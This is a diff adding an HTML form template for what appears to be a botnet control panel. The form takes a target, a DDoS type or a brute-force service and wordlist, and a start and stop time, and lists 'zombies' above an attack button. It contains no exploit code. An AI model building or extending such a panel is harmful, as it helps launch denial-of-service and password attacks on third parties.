@@ -1,0 +1,82 @@
+
+{% block form %}
+
+<form id="{{ data_type + '-form' }}" action="" method="POST">
+
+  <div class="field-row-stacked">
+    <label for="target"><span class="margin-right-icon">🎯  </span><span> target:</span> </label>
+    <input id="target" name="target" type="text" value="{{ request.form.target }}" />
+  </div>
+
+  {% if 'ddos' in data_type %}
+    <div class="field-row-stacked">
+      {% include 'objects/forms/inputs/ddos_type-dropdown.html' %}
+    </div>
+
+  {% elif 'brute' in data_type %}
+    <div class="field-row-stacked">
+      {% include 'objects/forms/inputs/brute_service-dropdown.html' %}
+    </div>
+    <div class="field-row-stacked">
+      <label for="brute_wordlist"><span class="margin-right-icon">🗒️  </span><span> wordlist:</span> </label>
+      <input id="brute_wordlist" name="brute_wordlist" type="text" value="{{ request.form.brute_wordlist }}" />
+    </div>
+  {% endif %}
+
+  <br>
+
+  <input type="checkbox" name="enable_start_dt" id="enable_start_dt" onclick="enable_fields_by(['start_dt'], 'enable_start_dt');">
+  <label for="enable_start_dt"><span class="margin-right-icon">⏲️  </span><span> start at:</span> </label>
+  <fieldset class="start_dt" id="start_dt" name="start_dt" disabled>
+    {% with bef_aft = 'aft', section = 'start_at' %}
+      {% include 'objects/forms/inputs/datetime.html' %}
+    {% endwith %}
+  </fieldset>
+
+  <input type="checkbox" name="enable_stop_dt" id="enable_stop_dt" onclick="enable_fields_by(['stop_dt'], 'enable_stop_dt');">
+  <label for="enable_stop_dt"><span class="margin-right-icon">⏲️  </span><span> stop at:</span> </label>
+  <fieldset class="stop_dt" id="stop_dt" name="start_dt" disabled>
+    {% with bef_aft = 'aft', section = 'stop_at' %}
+      {% include 'objects/forms/inputs/datetime.html' %}
+    {% endwith %}
+  </fieldset>
+  <br>
+
+
+  {% if (create_error and 'password' in create_error) %}
+  <div style="width: 100%; margin 0 auto;"><p class="error">{{ create_error }}</p></div>
+  {% endif %}
+
+
+  {% with data_type = 'zombies', brief=True, scrollable_table=True, max_height="12.7rem" %}
+    {% include 'objects/tables/data-results.html' %}
+  {% endwith %}
+
+
+<!--  {% if selected_zombies %}-->
+<!--  <ul class="tree-view">-->
+<!--    <li>-->
+<!--      <details>-->
+<!--        <summary>zombies selected</summary>-->
+<!--        <ul>-->
+<!--          {% for zombie in selected_zombies %}-->
+<!--            <li>-->
+<!--              <span class="img-icon margin-left-icon"><img src="{{ url_for('static', filename='img/aoe2icon-green.png') }}" width="11rem" /></span>-->
+<!--              {{ zombie }}-->
+<!--              <input id="{{ zombie }}-selected" name="zombies_selected" type="text" value="{{ zombie }}" hidden />-->
+<!--            </li>-->
+<!--          {% endfor %}-->
+<!--        </ul>-->
+<!--      </details>-->
+<!--    </li>-->
+<!--  </ul>-->
+<!--  {% endif %}-->
+
+  <div class="field-row-stacked">
+    {% include 'objects/forms/inputs/attack-button.html' %}
+  </div>
+
+
+</form>
+
+{% endblock %}
